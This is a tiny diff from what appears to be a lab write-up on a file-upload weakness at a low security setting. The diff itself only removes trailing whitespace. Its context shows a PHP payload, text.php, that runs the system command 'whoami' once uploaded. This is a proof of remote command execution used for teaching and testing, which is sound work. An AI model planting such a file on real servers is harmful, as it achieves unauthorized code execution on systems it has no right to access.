@@ -6,7 +6,7 @@
 **Payload:** text.php
 ```php  
   <?php echo "Hi there~ !"; system('whoami'); ?>  
-``` 
+```
     
 ## Steps taken:
 1. Set sec to low
